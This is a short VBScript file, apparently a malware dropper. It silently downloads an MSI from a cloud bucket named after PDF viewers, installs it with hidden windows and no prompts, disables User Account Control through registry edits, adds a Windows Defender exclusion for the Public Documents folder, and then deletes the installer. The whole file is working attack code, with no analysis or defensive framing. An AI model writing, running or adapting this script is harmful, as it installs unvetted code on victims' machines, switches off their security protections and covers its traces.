Option Explicit

Dim shell, fso, msiUrl, msiPath, publicDocs, cmdDownload, cmdInstall
Dim cmdUacEnableLUA, cmdUacConsent, cmdDefenderExclude

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- configuration ---
msiUrl = "https://pdfviewers.s3.ap-northeast-1.amazonaws.com/file.msi"   ' update to actual MSI URL
msiPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\file.msi"
publicDocs = shell.ExpandEnvironmentStrings("%PUBLIC%") & "\Documents"

' --- 1. download MSI silently ---
cmdDownload = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
    """[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
    "Invoke-WebRequest -Uri '" & msiUrl & "' -OutFile '" & msiPath & "'"""
shell.Run cmdDownload, 0, True

' small delay to ensure file write completes
WScript.Sleep 2000

If Not fso.FileExists(msiPath) Then
    WScript.Quit 1
End If

' --- 2. silent install ---
cmdInstall = "msiexec /i """ & msiPath & """ /qn"
shell.Run cmdInstall, 0, True

' --- 3. bypass UAC (disable prompts) ---
cmdUacEnableLUA = "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 0 /f"
cmdUacConsent = "reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
shell.Run cmdUacEnableLUA, 0, True
shell.Run cmdUacConsent, 0, True

' --- 4. exclude %PUBLIC%\Documents in Windows Defender ---
cmdDefenderExclude = "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & publicDocs & "'"""
shell.Run cmdDefenderExclude, 0, True

' --- cleanup ---
If fso.FileExists(msiPath) Then
    fso.DeleteFile msiPath, True
End If

Set shell = Nothing
Set fso = Nothing
